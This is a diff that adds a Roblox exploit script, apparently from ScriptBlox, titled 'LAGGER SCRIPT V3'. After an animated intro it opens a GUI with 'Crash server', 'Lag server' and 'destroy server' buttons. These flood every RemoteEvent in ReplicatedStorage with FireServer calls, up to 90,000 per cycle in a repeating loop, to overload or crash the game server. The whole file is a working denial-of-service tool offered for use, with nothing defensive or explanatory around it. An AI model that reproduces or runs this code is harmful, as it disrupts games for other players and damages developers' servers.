@@ -1,0 +1,232 @@
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+local success, err = pcall(function()
+    sethiddenproperty(game.Players.LocalPlayer, "MaximumSimulationRadius", math.huge)
+    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
+
+    local Players = game:GetService("Players")
+    local TweenService = game:GetService("TweenService")
+    local StarterGui = game:GetService("StarterGui")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    
+    local player = Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+
+    -- >> INTRODUÇÃO <<
+    local introGui = Instance.new("ScreenGui", playerGui)
+    introGui.Name = "LaggerIntro"
+    introGui.IgnoreGuiInset = true
+    introGui.ResetOnSpawn = false
+
+    local bg = Instance.new("Frame", introGui)
+    bg.Size = UDim2.fromScale(1, 1)
+    bg.BackgroundColor3 = Color3.new(0, 0, 0)
+    bg.BackgroundTransparency = 1
+    bg.BorderSizePixel = 0
+
+    local title = Instance.new("TextLabel", bg)
+    title.Text = "LAGGER SCRIPT V3"
+    title.Font = Enum.Font.GothamBlack
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.TextSize = 45
+    title.Size = UDim2.fromScale(1, 0.1)
+    title.Position = UDim2.fromScale(0.5, 0.45)
+    title.AnchorPoint = Vector2.new(0.5, 0.5)
+    title.BackgroundTransparency = 1
+    title.TextTransparency = 1
+    
+    local credits = Instance.new("TextLabel", bg)
+    credits.Text = 'Made by the Roblox user "ericklowey123"'
+    credits.Font = Enum.Font.GothamMedium
+    credits.TextColor3 = Color3.fromRGB(200, 200, 200)
+    credits.TextSize = 18
+    credits.Size = UDim2.fromScale(1, 0.05)
+    credits.Position = UDim2.fromScale(0.5, 0.52)
+    credits.AnchorPoint = Vector2.new(0.5, 0.5)
+    credits.BackgroundTransparency = 1
+    credits.TextTransparency = 1
+
+    -- Animação de Entrada
+    TweenService:Create(bg, TweenInfo.new(1), {BackgroundTransparency = 0.4}):Play()
+    task.wait(1)
+    
+    TweenService:Create(title, TweenInfo.new(1, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {TextTransparency = 0, Position = UDim2.fromScale(0.5, 0.45)}):Play()
+    task.wait(0.3)
+    TweenService:Create(credits, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0, Position = UDim2.fromScale(0.5, 0.52)}):Play()
+    
+    task.wait(3)
+
+    -- Animação de Saída
+    TweenService:Create(title, TweenInfo.new(0.5), {TextTransparency = 1, Position = UDim2.fromScale(0.5, 0.4)}):Play()
+    TweenService:Create(credits, TweenInfo.new(0.5), {TextTransparency = 1, Position = UDim2.fromScale(0.5, 0.55)}):Play()
+    TweenService:Create(bg, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
+    
+    task.wait(1)
+    introGui:Destroy()
+
+    -- >> INÍCIO DO SCRIPT PRINCIPAL <<
+    local allRemoteEvents = {}
+    local powerLoopActive = false
+    local powerLoopCoroutine
+    local destructionLoopActive = false
+    local destructionLoopCoroutine
+
+    StarterGui:SetCore("SendNotification", { Title = "Checking RemoteEvents..", Text = "looking for remoteevents on Replicatedstorage." })
+    task.wait(1)
+
+    for _, child in ipairs(ReplicatedStorage:GetChildren()) do
+        if child:IsA("RemoteEvent") then table.insert(allRemoteEvents, child) end
+    end
+
+    if #allRemoteEvents > 0 then
+        StarterGui:SetCore("SendNotification", { Title = "RemoteEvents found!", Text = "Remoteevents found successfully.", Duration = 5 })
+
+        local serverButtonGui = Instance.new("ScreenGui", playerGui)
+        serverButtonGui.Name = "ServerButtonGui"; serverButtonGui.ResetOnSpawn = false; serverButtonGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+        local serverButton = Instance.new("TextButton", serverButtonGui)
+        serverButton.Name = "ServerButton"; serverButton.Text = "lagger"; serverButton.Font = Enum.Font.SourceSansBold
+        serverButton.TextColor3 = Color3.fromRGB(255, 255, 255); serverButton.TextSize = 14
+        serverButton.BackgroundColor3 = Color3.fromRGB(35, 35, 45); serverButton.BorderSizePixel = 0
+        serverButton.Size = UDim2.fromOffset(50, 50); serverButton.Position = UDim2.fromScale(0.5, 0.5)
+        serverButton.AnchorPoint = Vector2.new(0.5, 0.5)
+        Instance.new("UICorner", serverButton).CornerRadius = UDim.new(0, 8)
+        Instance.new("UIStroke", serverButton).Color = Color3.fromRGB(120, 120, 140)
+
+        local mainServerGui = Instance.new("ScreenGui", playerGui)
+        mainServerGui.Name = "MainServerGui"; mainServerGui.Enabled = false; mainServerGui.ResetOnSpawn = false
+        mainServerGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+        local mainFrame = Instance.new("Frame", mainServerGui)
+        mainFrame.Name = "MainFrame"; mainFrame.Size = UDim2.fromOffset(400, 300)
+        mainFrame.Position = UDim2.fromScale(0.5, 0.5); mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+        mainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 55); mainFrame.BorderSizePixel = 0
+        Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)
+        Instance.new("UIStroke", mainFrame).Color = Color3.fromRGB(150, 150, 170); mainFrame.ClipsDescendants = true
+
+        local titleBar = Instance.new("TextLabel", mainFrame)
+        titleBar.Name = "TitleBar"; titleBar.Size = UDim2.new(1, 0, 0, 30); titleBar.BackgroundColor3 = Color3.fromRGB(60, 60, 75)
+        titleBar.Font = Enum.Font.SourceSansBold; titleBar.TextColor3 = Color3.fromRGB(255, 255, 255); titleBar.Text = "Server lag GUI"; titleBar.TextSize = 16
+        Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 8)
+
+        local mainButtonsFrame = Instance.new("Frame", mainFrame)
+        mainButtonsFrame.Size = UDim2.new(1, 0, 1, -30); mainButtonsFrame.Position = UDim2.new(0, 0, 0, 30)
+        mainButtonsFrame.BackgroundTransparency = 1
+
+        local powerGuiFrame = Instance.new("Frame", mainFrame)
+        powerGuiFrame.Size = UDim2.new(1, 0, 1, -30); powerGuiFrame.Position = UDim2.new(0, 0, 0, 30)
+        powerGuiFrame.BackgroundTransparency = 1; powerGuiFrame.Visible = false
+
+        local button1 = Instance.new("TextButton", mainButtonsFrame)
+        button1.Name = "Button1"; button1.Text = "Crash server"; button1.Font = Enum.Font.SourceSans; button1.TextSize = 16
+        button1.TextColor3 = Color3.fromRGB(220, 220, 220); button1.BackgroundColor3 = Color3.fromRGB(80, 80, 95)
+        button1.Size = UDim2.fromOffset(150, 35); button1.Position = UDim2.new(0.5, 0, 0, 50); button1.AnchorPoint = Vector2.new(0.5, 0)
+        Instance.new("UICorner", button1).CornerRadius = UDim.new(0, 6)
+
+        local button2 = Instance.new("TextButton", mainButtonsFrame)
+        button2.Name = "Button2"; button2.Text = "Lag server"; button2.Font = Enum.Font.SourceSans; button2.TextSize = 16
+        button2.TextColor3 = Color3.fromRGB(220, 220, 220); button2.BackgroundColor3 = Color3.fromRGB(80, 80, 95)
+        button2.Size = UDim2.fromOffset(150, 35); button2.Position = UDim2.new(0.5, 0, 0, 100); button2.AnchorPoint = Vector2.new(0.5, 0)
+        Instance.new("UICorner", button2).CornerRadius = UDim.new(0, 6)
+        
+        local button3 = Instance.new("TextButton", mainButtonsFrame)
+        button3.Name = "Button3"; button3.Text = "destroy server"; button3.Font = Enum.Font.SourceSans; button3.TextSize = 14
+        button3.TextColor3 = Color3.fromRGB(220, 220, 220); button3.BackgroundColor3 = Color3.fromRGB(120, 40, 40)
+        button3.Size = UDim2.fromOffset(150, 35); button3.Position = UDim2.new(0.5, 0, 0, 150); button3.AnchorPoint = Vector2.new(0.5, 0)
+        Instance.new("UICorner", button3).CornerRadius = UDim.new(0, 6)
+
+        local powerLabel = Instance.new("TextLabel", powerGuiFrame)
+        powerLabel.Text = "Power: (20-500)"; powerLabel.Font = Enum.Font.SourceSans; powerLabel.TextSize = 16
+        powerLabel.TextColor3 = Color3.fromRGB(220, 220, 220); powerLabel.BackgroundTransparency = 1
+        powerLabel.Size = UDim2.fromOffset(200, 30); powerLabel.Position = UDim2.new(0.5, 0, 0, 50); powerLabel.AnchorPoint = Vector2.new(0.5, 0)
+
+        local numberBox = Instance.new("TextBox", powerGuiFrame)
+        numberBox.PlaceholderText = "..."; numberBox.Font = Enum.Font.SourceSansBold; numberBox.TextSize = 16
+        numberBox.TextColor3 = Color3.fromRGB(255, 255, 255); numberBox.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+        numberBox.Size = UDim2.fromOffset(200, 40); numberBox.Position = UDim2.new(0.5, 0, 0, 80); numberBox.AnchorPoint = Vector2.new(0.5, 0)
+        Instance.new("UICorner", numberBox).CornerRadius = UDim.new(0, 6)
+
+        local applyButton = Instance.new("TextButton", powerGuiFrame)
+        applyButton.Text = "Lag"; applyButton.Font = Enum.Font.SourceSansBold; applyButton.TextSize = 18
+        applyButton.TextColor3 = Color3.fromRGB(255, 255, 255); applyButton.BackgroundColor3 = Color3.fromRGB(80, 160, 100)
+        applyButton.Size = UDim2.fromOffset(200, 40); applyButton.Position = UDim2.new(0.5, 0, 0, 140); applyButton.AnchorPoint = Vector2.new(0.5, 0)
+        Instance.new("UICorner", applyButton).CornerRadius = UDim.new(0, 6)
+        
+        local closeButtonX = Instance.new("TextButton", powerGuiFrame)
+        closeButtonX.Text = "X"; closeButtonX.Font = Enum.Font.SourceSansBold; closeButtonX.TextSize = 18
+        closeButtonX.TextColor3 = Color3.fromRGB(220, 220, 220); closeButtonX.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
+        closeButtonX.Size = UDim2.fromOffset(25, 25); closeButtonX.Position = UDim2.new(1, -5, 0, -25); closeButtonX.AnchorPoint = Vector2.new(1, 0)
+        Instance.new("UICorner", closeButtonX).CornerRadius = UDim.new(1, 0)
+        
+        local confirmationFrame = Instance.new("Frame", mainFrame)
+        confirmationFrame.Name = "ConfirmationFrame"; confirmationFrame.Size = UDim2.new(0.8, 0, 0.5, 0); confirmationFrame.Position = UDim2.fromScale(0.5, 0.5)
+        confirmationFrame.AnchorPoint = Vector2.new(0.5, 0.5); confirmationFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
+        confirmationFrame.BorderSizePixel = 0; confirmationFrame.Visible = false
+        Instance.new("UICorner", confirmationFrame).CornerRadius = UDim.new(0, 8)
+        
+        local confirmLabel = Instance.new("TextLabel", confirmationFrame)
+        confirmLabel.Text = "Are you sure you want to destroy the server?"; confirmLabel.Font = Enum.Font.SourceSans; confirmLabel.TextSize = 16
+        confirmLabel.TextColor3 = Color3.fromRGB(255, 255, 255); confirmLabel.BackgroundTransparency = 1; confirmLabel.Size = UDim2.new(1, -20, 0.6, 0)
+        confirmLabel.Position = UDim2.fromScale(0.5, 0.3); confirmLabel.AnchorPoint = Vector2.new(0.5, 0.5); confirmLabel.TextWrapped = true
+
+        local yesButton = Instance.new("TextButton", confirmationFrame)
+        yesButton.Text = "Yes"; yesButton.Font = Enum.Font.SourceSansBold; yesButton.TextSize = 16
+        yesButton.TextColor3 = Color3.fromRGB(255, 255, 255); yesButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
+        yesButton.Size = UDim2.new(0.4, 0, 0.25, 0); yesButton.Position = UDim2.fromScale(0.25, 0.75); yesButton.AnchorPoint = Vector2.new(0.5, 0.5)
+        Instance.new("UICorner", yesButton).CornerRadius = UDim.new(0, 6)
+        
+        local noButton = Instance.new("TextButton", confirmationFrame)
+        noButton.Text = "No"; noButton.Font = Enum.Font.SourceSansBold; noButton.TextSize = 16
+        noButton.TextColor3 = Color3.fromRGB(255, 255, 255); noButton.BackgroundColor3 = Color3.fromRGB(80, 80, 95)
+        noButton.Size = UDim2.new(0.4, 0, 0.25, 0); noButton.Position = UDim2.fromScale(0.75, 0.75); noButton.AnchorPoint = Vector2.new(0.5, 0.5)
+        Instance.new("UICorner", noButton).CornerRadius = UDim.new(0, 6)
+
+        local function resetButton2Appearance() button2.Text = "Lag server"; button2.BackgroundColor3 = Color3.fromRGB(80, 80, 95) end
+        local function resetButton3Appearance() button3.Text = "destroy server"; button3.BackgroundColor3 = Color3.fromRGB(120, 40, 40) end
+
+        button1.MouseButton1Click:Connect(function() mainServerGui.Enabled = false; StarterGui:SetCore("SendNotification", {Title="Crashing server..", Text="server is gonna crash in a few secs", Duration=3}); task.delay(1, function() if serverButtonGui.Parent then for i=1,4 do for _,r in ipairs(allRemoteEvents) do pcall(function()r:FireServer(i)end) end end end end) end)
+        
+        button2.MouseButton1Click:Connect(function() if powerLoopActive then powerLoopActive=false; if powerLoopCoroutine then task.cancel(powerLoopCoroutine) end; resetButton2Appearance(); StarterGui:SetCore("SendNotification", {Title="Lag stopped", Text="server lag successfully stopped.", Duration=4}) else titleBar.Text="insert the lag power"; mainButtonsFrame.Visible=false; powerGuiFrame.Visible=true end end)
+        
+        button3.MouseButton1Click:Connect(function() if destructionLoopActive then destructionLoopActive = false; if destructionLoopCoroutine then task.cancel(destructionLoopCoroutine) end; resetButton3Appearance(); StarterGui:SetCore("SendNotification", {Title="Destruction Stopped", Text="Server destruction has been disabled.", Duration=4}) else confirmationFrame.Visible = true end end)
+        
+        closeButtonX.MouseButton1Click:Connect(function() titleBar.Text="Server lag GUI"; powerGuiFrame.Visible=false; mainButtonsFrame.Visible=true end)
+
+        noButton.MouseButton1Click:Connect(function() confirmationFrame.Visible = false end)
+        
+        yesButton.MouseButton1Click:Connect(function()
+            confirmationFrame.Visible = false
+            mainServerGui.Enabled = false
+            StarterGui:SetCore("SendNotification", { Title = "LAGGER GUI", Text = "initiating server destruction in 5s..", Duration = 3 })
+            
+            task.delay(5, function()
+                if not serverButtonGui.Parent then return end
+                destructionLoopActive = true
+                button3.Text = "disable server destruction"
+                button3.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+                
+                destructionLoopCoroutine = task.spawn(function()
+                    while destructionLoopActive and serverButtonGui.Parent do
+                        for i = 1, 90000 do for _, r in ipairs(allRemoteEvents) do pcall(function() r:FireServer(i) end) end end
+                        task.wait(0.42)
+                    end
+                    destructionLoopActive = false
+                    if button3.Parent then resetButton3Appearance() end
+                end)
+            end)
+        end)
+
+        applyButton.MouseButton1Click:Connect(function() local num=tonumber(numberBox.Text); if num and num>=20 and num<=500 then powerLoopActive=true; mainServerGui.Enabled=false; button2.Text="stop lag"; button2.BackgroundColor3=Color3.fromRGB(180,60,60); titleBar.Text="Server lag GUI"; powerGuiFrame.Visible=false; mainButtonsFrame.Visible=true; powerLoopCoroutine=task.spawn(function() while powerLoopActive and mainServerGui.Parent do for i=1,num do for _,r in ipairs(allRemoteEvents) do pcall(function()r:FireServer(i)end) end end; task.wait(1) end; powerLoopActive=false; if button2.Parent then resetButton2Appearance() end end) else StarterGui:SetCore("SendNotification", {Title="Error", Text="Please insert a number between 20 and 500.", Duration=4}) end end)
+
+        local clickCount,lastClickTime,CLICK_INTERVAL,tipShown=0,0,1,false
+        serverButton.MouseButton1Click:Connect(function() local now=tick(); if now-lastClickTime > CLICK_INTERVAL then clickCount=1 else clickCount+=1 end; lastClickTime=now; if clickCount>=3 then print("Script has been interrupted."); powerLoopActive=false; if powerLoopCoroutine then task.cancel(powerLoopCoroutine) end; destructionLoopActive = false; if destructionLoopCoroutine then task.cancel(destructionLoopCoroutine) end; StarterGui:SetCore("SendNotification", {Title="button deleted",Text="if you want the button back, re-execute this script.",Duration=5}); mainServerGui:Destroy(); serverButtonGui:Destroy(); return end; mainServerGui.Enabled=not mainServerGui.Enabled; if mainServerGui.Enabled and not tipShown then tipShown=true; StarterGui:SetCore("SendNotification",{Title="tip",Text="tap on the button 3 times to delete it",Duration=5}) end end)
+        local dragging,dragStart,startPos
+        serverButton.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then dragging,dragStart,startPos=true,i.Position,serverButton.Position; i.Changed:Connect(function() if i.UserInputState==Enum.UserInputState.End then dragging=false end end) end end)
+        serverButton.InputChanged:Connect(function(i) if(i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) and dragging then local d=i.Position-dragStart; serverButton.Position=UDim2.new(startPos.X.Scale, startPos.X.Offset+d.X,startPos.Y.Scale,startPos.Y.Offset+d.Y) end end)
+        serverButton.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then dragging=false end end)
+    else
+        StarterGui:SetCore("SendNotification", { Title = "Game not supported", Text = "no remotes were detected on this game, please try a different one.", Duration = 5 })
+    end
+end)
+if not success then warn("Script failed to execute:", err) end
